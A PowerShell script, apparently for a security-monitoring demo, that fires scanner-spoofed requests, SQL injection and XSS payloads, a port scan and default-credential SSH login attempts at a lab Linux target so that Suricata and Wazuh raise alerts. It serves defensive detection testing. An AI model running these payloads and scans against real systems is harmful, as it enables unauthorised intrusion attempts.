<#
.SYNOPSIS
    Windows Attacker PowerShell Script for SOC Demo
    
.DESCRIPTION
    This script simulates various attack scenarios from a Windows attacker
    against an Alma Linux victim running a SOC stack.

.PARAMETER TargetIP
    IP address of the Alma Linux victim machine

.EXAMPLE
    .\windows-attacker.ps1 -TargetIP "192.168.1.100" -All
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$TargetIP,
    
    [Parameter()]
    [int]$HttpPort = 80,
    
    [Parameter()]
    [int]$SshPort = 22,
    
    [Parameter()]
    [switch]$All,
    
    [Parameter()]
    [switch]$Quick,
    
    [switch]$Continuous,
    
    [Parameter()]
    [int]$Interval = 60
)

# Attack log
$script:AttackLog = @()

function Write-Banner($Title) {
    $width = 70
    $line = "=" * $width
    Write-Host "`n$line" -ForegroundColor Magenta
    Write-Host $Title.PadLeft([int](($width + $Title.Length) / 2)).PadRight($width) -ForegroundColor Magenta
    Write-Host "$line`n" -ForegroundColor Magenta
}

function Write-Info($Message) { Write-Host "[INFO] $Message" -ForegroundColor Cyan }
function Write-Success($Message) { Write-Host "[SUCCESS] $Message" -ForegroundColor Green }
function Write-Warning($Message) { Write-Host "[WARNING] $Message" -ForegroundColor Yellow }
function Write-Error($Message) { Write-Host "[ERROR] $Message" -ForegroundColor Red }
function Write-Section($Title) {
    Write-Host "`n[*] $Title" -ForegroundColor Yellow
    Write-Host "-" * ($Title.Length + 4) -ForegroundColor Yellow
}

function Add-AttackLog($Type, $Target, $Status, $Details = "") {
    $script:AttackLog += [PSCustomObject]@{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Type = $Type
        Target = $Target
        Status = $Status
        Details = $Details
    }
}

function Invoke-WebScannerDetection {
    Write-Section "Web Scanner Detection Attack"
    Write-Info "Target: http://$TargetIP`:$HttpPort"
    
    $scanners = @(
        @{ Name = "Nikto Web Scanner"; Agent = "Nikto/2.1.6" },
        @{ Name = "Nmap Scripting Engine"; Agent = "Mozilla/5.0 (compatible; Nmap Scripting Engine)" },
        @{ Name = "SQLMap Scanner"; Agent = "sqlmap/1.0-dev" }
    )
    
    foreach ($scanner in $scanners) {
        try {
            $headers = @{ "User-Agent" = $scanner.Agent }
            $response = Invoke-WebRequest -Uri "http://$TargetIP`:$HttpPort/" -Headers $headers -Method GET -TimeoutSec 5
            Write-Success "$($scanner.Name): HTTP $($response.StatusCode)"
            Add-AttackLog -Type "Web Scanner Detection" -Target "$TargetIP`:$HttpPort" -Status "SUCCESS" -Details "Scanner: $($scanner.Name)"
        }
        catch {
            if ($_.Exception.Response) {
                $statusCode = [int]$_.Exception.Response.StatusCode
                Write-Warning "$($scanner.Name): HTTP $statusCode (Expected)"
                Add-AttackLog -Type "Web Scanner Detection" -Target "$TargetIP`:$HttpPort" -Status "SUCCESS" -Details "Scanner: $($scanner.Name), Status: $statusCode"
            }
            else {
                Write-Error "$($scanner.Name): $($_.Exception.Message)"
                Add-AttackLog -Type "Web Scanner Detection" -Target "$TargetIP`:$HttpPort" -Status "FAILED" -Details $_.Exception.Message
            }
        }
        Start-Sleep -Milliseconds 500
    }
}

function Invoke-SQLInjection {
    Write-Section "SQL Injection Attack"
    Write-Info "Target: http://$TargetIP`:$HttpPort"
    
    $payloads = @(
        @{ Name = "Classic SQLi"; Path = "/search?q=1%27+OR+%271%27=%271" },
        @{ Name = "UNION SQLi"; Path = "/search?q=1%27+UNION+SELECT+1,2,3--" }
    )
    
    $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
    
    foreach ($payload in $payloads) {
        try {
            $url = "http://$TargetIP`:$HttpPort$($payload.Path)"
            $response = Invoke-WebRequest -Uri $url -Headers $headers -Method GET -TimeoutSec 5
            Write-Success "$($payload.Name): HTTP $($response.StatusCode)"
            Add-AttackLog -Type "SQL Injection" -Target $url -Status "SUCCESS" -Details "Payload: $($payload.Path)"
        }
        catch {
            if ($_.Exception.Response) {
                $statusCode = [int]$_.Exception.Response.StatusCode
                Write-Warning "$($payload.Name): HTTP $statusCode (WAF/IDS blocked)"
                Add-AttackLog -Type "SQL Injection" -Target $url -Status "SUCCESS" -Details "Blocked with HTTP $statusCode"
            }
            else {
                Write-Error "$($payload.Name): $($_.Exception.Message)"
                Add-AttackLog -Type "SQL Injection" -Target $url -Status "FAILED" -Details $_.Exception.Message
            }
        }
        Start-Sleep -Milliseconds 300
    }
}

function Invoke-XSSAttack {
    Write-Section "Cross-Site Scripting (XSS) Attack"
    Write-Info "Target: http://$TargetIP`:$HttpPort"
    
    $payloads = @(
        @{ Name = "Basic XSS"; Path = "/comment?text=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E" },
        @{ Name = "Image XSS"; Path = "/upload?file=%3Cimg+src=x+onerror=alert(%27XSS%27)%3E" }
    )
    
    $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
    
    foreach ($payload in $payloads) {
        try {
            $url = "http://$TargetIP`:$HttpPort$($payload.Path)"
            $response = Invoke-WebRequest -Uri $url -Headers $headers -Method GET -TimeoutSec 5
            Write-Success "$($payload.Name): HTTP $($response.StatusCode)"
            Add-AttackLog -Type "XSS Attack" -Target $url -Status "SUCCESS" -Details "Payload: $($payload.Path)"
        }
        catch {
            if ($_.Exception.Response) {
                $statusCode = [int]$_.Exception.Response.StatusCode
                Write-Warning "$($payload.Name): HTTP $statusCode (WAF/IDS blocked)"
                Add-AttackLog -Type "XSS Attack" -Target $url -Status "SUCCESS" -Details "Blocked with HTTP $statusCode"
            }
            else {
                Write-Error "$($payload.Name): $($_.Exception.Message)"
                Add-AttackLog -Type "XSS Attack" -Target $url -Status "FAILED" -Details $_.Exception.Message
            }
        }
        Start-Sleep -Milliseconds 300
    }
}

function Invoke-SSHBruteForce($Attempts = 5) {
    Write-Section "SSH Brute Force Attack"
    Write-Info "Target: $TargetIP`:$SshPort"
    Write-Info "Attempts: $Attempts"
    
    $usernames = @("root", "admin", "user", "test", "oracle")
    $passwords = @("password", "123456", "admin", "root", "toor")
    
    Write-Info "Starting brute force attempts..."
    
    for ($i = 0; $i -lt [Math]::Min($Attempts, $usernames.Count); $i++) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($TargetIP, $SshPort)
            $stream = $client.GetStream()
            $stream.ReadTimeout = 3000
            
            # Read SSH banner
            $buffer = New-Object byte[] 1024
            $bytesRead = $stream.Read($buffer, 0, 1024)
            $banner = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
            Write-Info "[$($i+1)/$Attempts] Connected - Banner: $($banner.Trim())"
            
            # Send fake auth attempt
            $authData = "$($usernames[$i])`x00$($passwords[$i % $passwords.Count])`r`n"
            $authBytes = [System.Text.Encoding]::ASCII.GetBytes($authData)
            $stream.Write($authBytes, 0, $authBytes.Length)
            
            Start-Sleep -Milliseconds 500
            $client.Close()
            
            Write-Warning "[$($i+1)/$Attempts] Auth attempt sent for user: $($usernames[$i])"
            Add-AttackLog -Type "SSH Brute Force" -Target "$TargetIP`:$SshPort" -Status "SUCCESS" -Details "Attempt $($i+1)/$Attempts, User: $($usernames[$i])"
        }
        catch {
            Write-Error "[$($i+1)/$Attempts] Error: $($_.Exception.Message)"
            Add-AttackLog -Type "SSH Brute Force" -Target "$TargetIP`:$SshPort" -Status "SUCCESS" -Details "Attempt $($i+1)/$Attempts, Error: $($_.Exception.Message)"
        }
        Start-Sleep -Milliseconds 500
    }
}

function Invoke-PortScan {
    Write-Section "Port Scanning"
    Write-Info "Target: $TargetIP"
    
    $ports = @(21, 22, 23, 25, 80, 443, 3306, 3389, 5432, 8080, 8443)
    $openPorts = @()
    
    Write-Info "Scanning $($ports.Count) ports..."
    
    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.ConnectAsync($TargetIP, $port).Wait(500) | Out-Null
            
            if ($client.Connected) {
                $openPorts += $port
                Write-Success "Port $port`: OPEN"
                $client.Close()
            }
            else {
                Write-Host "Port $port`: Closed" -ForegroundColor Gray
            }
        }
        catch {
            Write-Host "Port $port`: Closed" -ForegroundColor Gray
        }
    }
    
    Add-AttackLog -Type "Port Scan" -Target $TargetIP -Status "SUCCESS" -Details "Scanned $($ports.Count) ports, Found $($openPorts.Count) open"
}

function Write-Summary {
    Write-Banner "ATTACK SUMMARY"
    
    $total = $script:AttackLog.Count
    $successful = ($script:AttackLog | Where-Object { $_.Status -eq "SUCCESS" }).Count
    $failed = ($script:AttackLog | Where-Object { $_.Status -eq "FAILED" }).Count
    
    Write-Host "Total attacks executed: $total"
    Write-Host "Successful: $successful" -ForegroundColor Green
    Write-Host "Failed: $failed" -ForegroundColor Red
    Write-Host ""
    
    Write-Host "Detailed Log:" -Bold
    foreach ($attack in $script:AttackLog) {
        $statusColor = if ($attack.Status -eq "SUCCESS") { "Green" } else { "Red" }
        Write-Host "  [$($attack.Timestamp)] $($attack.Type) -> $($attack.Target): $($attack.Status)" -ForegroundColor $statusColor
        if ($attack.Details) {
            Write-Host "    Details: $($attack.Details)" -ForegroundColor Gray
        }
    }
}

# ==================== MAIN EXECUTION ====================

Write-Banner "SOC DEMO - WINDOWS ATTACKER"
Write-Info "Target: $TargetIP"
Write-Info "HTTP Port: $HttpPort"
Write-Info "SSH Port: $SshPort"
Write-Host ""

$cycleCount = 0
try {
    while ($true) {
        $cycleCount++
        if ($Continuous) {
            Write-Banner "ATTACK CYCLE #$cycleCount"
        }
        
        if ($All) {
            Invoke-WebScannerDetection
            Start-Sleep -Seconds 1
            Invoke-SQLInjection
            Start-Sleep -Seconds 1
            Invoke-XSSAttack
            Start-Sleep -Seconds 1
            Invoke-PortScan
            Start-Sleep -Seconds 1
            Invoke-SSHBruteForce -Attempts 5
        }
        elseif ($Quick) {
            Write-Banner "QUICK DEMO MODE"
            Invoke-WebScannerDetection
            Start-Sleep -Seconds 1
            Invoke-SQLInjection
            Start-Sleep -Seconds 1
            Invoke-SSHBruteForce -Attempts 5
        }
        else {
            Write-Info "Running default attack set..."
            Invoke-WebScannerDetection
            Start-Sleep -Seconds 1
            Invoke-SQLInjection
            Start-Sleep -Seconds 1
            Invoke-SSHBruteForce -Attempts 5
        }
        
        Write-Summary
        
        if (-not $Continuous) {
            break
        }
        
        Write-Info "`nWaiting $Interval seconds before next cycle..."
        Write-Info "Press Ctrl+C to stop`n"
        Start-Sleep -Seconds $Interval
    }
}
catch {
    Write-Warning "`nAttack interrupted by user"
    Write-Summary
}

Write-Banner "DEMO COMPLETE"
Write-Info "Check the following dashboards for detected attacks:"
Write-Info "  - Kibana (Suricata): http://$TargetIP`:5601"
Write-Info "  - Wazuh Dashboard: https://$TargetIP"
Write-Host ""
Write-Info "Look for alerts in these index patterns:"
Write-Info "  - suricata-ids-* (Network attacks)"
Write-Info "  - wazuh-alerts-* (Host-based attacks)"
